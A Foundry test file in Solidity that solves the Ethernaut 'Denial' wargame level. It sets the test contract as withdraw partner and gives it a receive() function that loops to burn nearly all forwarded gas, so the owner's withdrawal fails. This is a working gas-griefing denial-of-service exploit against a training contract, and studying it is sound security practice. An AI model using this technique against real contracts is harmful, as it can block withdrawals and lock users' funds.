// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/20-Denial/Denial.sol";
import "../src/levels/20-Denial/DenialFactory.sol";

contract DenialTest is Test {
    Ethernaut public ethernaut;
    DenialFactory public denialFactory;
    Denial public denial;

    address public attacker = address(0x1);

    address internal _levelAddr;

    function setUp() public {
        vm.deal(attacker, 10_000 ether);

        ethernaut = new Ethernaut();
        denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);

        vm.startPrank(attacker);
        _levelAddr = ethernaut.createLevelInstance{value: 100 ether}(
            denialFactory
        );
        denial = Denial(payable(_levelAddr));
    }

    function testAttack() public {
        denial.setWithdrawPartner(address(this));

        // Submit level
        bool success = ethernaut.submitLevelInstance(payable(_levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }

    receive() external payable {
        while (true) {
            if (gasleft() < 10_000) {
                break;
            }

            // perform expensive operation to waste gas
            uint(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.difficulty,
                        msg.sender
                    )
                )
            );
        }
    }
}
